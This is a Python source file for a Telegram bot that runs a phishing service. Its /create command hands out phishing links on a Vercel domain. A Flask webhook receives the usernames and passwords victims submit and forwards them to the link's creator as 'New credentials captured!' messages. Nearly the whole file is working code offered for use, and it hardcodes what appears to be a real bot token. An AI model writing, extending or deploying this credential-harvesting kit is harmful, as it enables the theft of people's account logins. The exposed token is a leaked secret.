import os
import requests
from flask import Flask, request, jsonify
from telebot import TeleBot, types

# Replace with your actual bot token and Vercel API endpoint
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8267518075:AAF4sxPLVF93KG8F8CNVuXQ7MoxgQFAyzOM")
VERCEL_API_ENDPOINT = os.environ.get("VERCEL_API_ENDPOINT", "https://phising-bot-niqc.vercel.app/api/api") # Your Vercel domain

bot = TeleBot(BOT_TOKEN)
app = Flask(__name__)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "Welcome! Use /create to generate a phishing link.")

@bot.message_handler(commands=['create'])
def create_link(message):
    user_id = message.from_user.id
    # In a real scenario, you'd generate a unique ID for the link
    # and store it to associate with credentials.
    phishing_link = f"{VERCEL_API_ENDPOINT}?uid={user_id}"
    bot.reply_to(message, f"Your phishing link has been created: {phishing_link}\n"
                           f"Any credentials submitted to this link will be sent to you here.")

# Flask endpoint to receive data from Vercel serverless function
@app.route('/webhook', methods=['POST'])
def webhook():
    if request.method == 'POST':
        data = request.json
        username = data.get('username')
        password = data.get('password')
        target_user_id = data.get('uid') # The user ID that created the link

        if username and password and target_user_id:
            try:
                bot.send_message(target_user_id, f"🚨 New credentials captured! 🚨\nUsername: {username}\nPassword: {password}")
                return jsonify({"status": "success"}), 200
            except Exception as e:
                print(f"Error sending message to user {target_user_id}: {e}")
                return jsonify({"status": "error", "message": str(e)}), 500
        return jsonify({"status": "error", "message": "Missing data"}), 400
    return jsonify({"status": "error", "message": "Invalid method"}), 405

if __name__ == '__main__':
    # This part would run your bot and Flask server
    # For local testing, you might use Flask's built-in server and ngrok.
    # For production, you'd deploy your bot separately (e.g., Heroku, a VPS)
    # and configure the webhook URL for Telegram.
    print("Bot running. Set your Telegram webhook to your_public_url/webhook")
    # bot.infinity_polling() # For long-polling if not using webhook
    # app.run(port=5000)
